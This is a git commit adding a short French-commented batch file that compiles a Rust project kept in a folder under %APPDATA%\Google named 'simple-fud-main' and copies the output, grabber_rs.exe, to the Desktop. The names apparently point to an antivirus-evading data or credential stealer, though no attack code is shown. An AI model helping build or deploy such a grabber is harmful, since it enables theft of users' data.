a1c5e0a419c78c3811e7916698509e1d965ed4d3
evasion78 <148644499+evasion78@users.noreply.github.com>
2023-10-23 05:31:41 +0200

    Add files via upload

---
+++ builder.bat
@@ -0,0 +1,24 @@
+@echo off
+setlocal enabledelayedexpansion
+
+:: Définir le chemin vers le répertoire Rust dans le dossier Roaming de l'utilisateur
+set rust_directory=%APPDATA%\Google\simple-fud-main
+
+:: Accéder au répertoire Rust
+cd %rust_directory%
+
+:: Compilation en mode "release" avec Cargo
+cargo build --release
+
+:: Vérifier si la compilation a réussi
+if %errorlevel% equ 0 (
+    echo Compilation réussie.
+    :: Copier le fichier exécutable vers le bureau de l'utilisateur
+    copy target\release\grabber_rs.exe %USERPROFILE%\Desktop
+    echo Fichier exécutable copié sur le bureau.
+) else (
+    echo Erreur de compilation.
+)
+
+:: Fin du script
+endlocal
